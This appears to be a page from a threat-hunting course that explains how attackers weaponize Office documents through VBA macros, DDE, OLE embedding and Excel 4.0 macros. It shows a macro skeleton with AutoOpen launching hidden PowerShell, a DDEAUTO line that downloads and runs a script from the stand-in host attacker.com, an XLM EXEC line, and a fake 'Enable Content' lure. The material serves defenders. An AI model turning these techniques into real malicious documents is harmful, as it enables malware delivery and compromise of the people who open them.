---
showTableOfContents: true
title: "Malicious Document Weaponization"
type: "page"
---


## Microsoft Office Macros

**What Are Macros?** Macros are VBA (Visual Basic for Applications) scripts that automate tasks within Office documents. While legitimate for business automation, they're perfect for attackers because:

- They execute arbitrary code
- They run in the user's security context
- Users are often trained to "enable content"

**How Macro Weaponization Works:**

```vb
' Example of malicious macro structure (simplified)
Sub AutoOpen()
    ' Triggers automatically when document opens (if macros enabled)
    DownloadAndExecute
End Sub

Sub DownloadAndExecute()
    ' Create WScript.Shell object to execute commands
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    
    ' Download payload using PowerShell
    Dim cmd As String
    cmd = "powershell.exe -NoP -sta -NonI -W Hidden -Exec Bypass " & _
          "-Enc <BASE64_ENCODED_DOWNLOAD_CRADLE>"
    
    ' Execute the command
    objShell.Run cmd, 0, False
End Sub
```

**Key Components Explained:**

1. **AutoOpen() or Document_Open()**: These special function names cause automatic execution when the document opens (requiring macros to be enabled)

2. **CreateObject("WScript.Shell")**: Creates a Windows Script Host object that can execute system commands

3. **PowerShell Execution**: The macro commonly spawns PowerShell because:

    - It's installed by default on Windows
    - Can download files from the internet
    - Can execute code directly in memory
    - Provides extensive system access
4. **Obfuscation Parameters**:

    - `-NoP` (NoProfile): Don't load PowerShell profile
    - `-NonI` (NonInteractive): No interactive prompt
    - `-W Hidden` (WindowStyle Hidden): Hide the window
    - `-Exec Bypass` (ExecutionPolicy Bypass): Ignore script execution restrictions
    - `-Enc` (EncodedCommand): Accept Base64-encoded command

**Social Engineering Wrapper:** The document typically contains a fake message:

```
⚠️ PROTECTED DOCUMENT
This document is protected. To view the content, please click "Enable Content" above.
[Microsoft Office Logo]
```



## Dynamic Data Exchange (DDE)

**What Is DDE?** DDE is a legacy Microsoft protocol for inter-process communication. It was exploited because it could execute commands without macros.

**How DDE Attacks Work:**

```
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" }
```

**Breaking This Down:**

- `DDEAUTO`: Automatically triggers the DDE field
- Calls `cmd.exe` which then calls PowerShell
- PowerShell downloads and executes a script from the attacker's server

**Why It Was Effective:**

- Worked in Word, Excel, Outlook
- Didn't require macros to be enabled
- Only triggered a warning, which users often ignored

**Current Status:** Microsoft has largely mitigated DDE attacks through patches and default settings, but it remains relevant in environments with legacy systems or incomplete patching.

## Object Linking and Embedding (OLE)

**What Is OLE?** OLE allows embedding objects from one application into documents of another. Attackers abuse this by embedding malicious executables or scripts.

**Common OLE Attack Methods:**

1. **Embedded Package Objects**:

    - Embed a `.exe`, `.hta`, `.vbs`, or other executable
    - Disguise with a legitimate-looking icon (PDF, document icon)
    - User double-clicks, executing the payload
    - **Why it works**: Users trust documents and don't realize they're executing code
2. **Embedded Script Files**:

    - Embed Windows Script Files (`.wsf`, `.vbs`, `.js`)
    - These can download and execute payloads
    - Less detected than pure executables
3. **Equation Editor Exploits (CVE-2017-11882)**:

    - Exploited a vulnerability in Equation Editor
    - Allowed code execution without user interaction
    - Embedded OLE object automatically triggered exploit
    - Very popular in 2017-2019 campaigns

**Example Attack Flow:**

```
User opens document → Embedded OLE package appears as PDF icon → 
User double-clicks → Actually executes embedded .exe → Payload runs
```


## Excel 4.0 Macros (XLM Macros)

**What Are XLM Macros?** Excel 4.0 macros are a legacy macro type that predates VBA. They've seen a resurgence because:

- Many security tools don't scan them
- Different analysis techniques required
- Still fully functional in modern Excel

**How They Work:**

XLM macros live in special "macro sheets" and use formulas for execution:

```
Cell A1: =EXEC("powershell.exe -w hidden IEX(...")
Cell A2: =HALT()
```

**Auto-execution Tricks:**

- Name the macro sheet "Auto_Open"
- Use hidden sheets
- Combine with legitimate-looking content

**Why Attackers Like Them:**

- Lower detection rates
- Security tools often miss them
- Users less aware of this attack vector



---

[//]: # ([|TOC|]&#40;{{< ref "../../../thrunt/_index.md" >}}&#41;)

[//]: # ([|NEXT|]&#40;{{< ref "./02_history.md" >}}&#41;)

